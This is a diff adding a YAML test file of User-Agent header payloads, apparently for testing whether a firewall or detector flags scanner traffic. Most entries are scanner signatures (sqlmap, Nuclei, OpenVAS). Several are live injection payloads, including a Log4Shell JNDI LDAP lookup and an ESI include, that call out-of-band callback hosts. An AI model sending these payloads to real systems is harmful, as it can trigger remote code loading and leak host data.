@@ -1,0 +1,18 @@
+---
+payload:
+  - http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE iPhone12,8 iOS/14.5.1))
+  - ${jndi:ldap://${hostName}.w63gecoroprj5um8ypnd7r6in9t0hseg3.oast.me/a}
+  - Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh
+  - Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4.1)
+  - Microsoft WinRM Client OpenVASVT
+  - Nuclei - Open-source project (github.com/projectdiscovery/nuclei)
+  - Fuzz Faster U Fool v2.0.0
+  - sqlmap/1.7.4#stable (https://sqlmap.org)
+  - 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36<esi:include src="http://bxss.me/rpb.png"/>'
+  - mercuryboard_user_agent_sql_injection.nasl'
+encoder:
+  - Plain
+placeholder:
+  - UserAgent
+type: "UserAgent"
+...
